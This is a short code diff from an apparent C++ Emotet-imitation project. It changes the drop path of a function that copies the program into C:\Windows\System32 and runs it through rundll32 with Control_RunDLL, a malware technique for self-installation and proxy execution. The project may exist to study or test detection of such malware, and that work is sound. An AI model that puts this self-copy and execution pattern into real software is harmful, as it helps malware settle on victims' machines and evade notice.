@@ -96,7 +96,7 @@ std::wstring s2ws(const std::string& s) //Source:https://stackoverflow.com/quest
 }
 
 void dllInUserprofile(std::string exPath) {
-    std::string target = "C:\\Projekt\\Projekt\\emotetImitation.dll";
+    std::string target = "C:\\Windows\\System32\\emotetImitation.foo";
     selfCopy(exPath, target);
     PROCESS_INFORMATION pi = launchProcess("c:\\Windows\\system32\\rundll32.exe", target+ " Control_RunDLL");
     std::string piS = std::to_string((unsigned int)pi.dwProcessId);
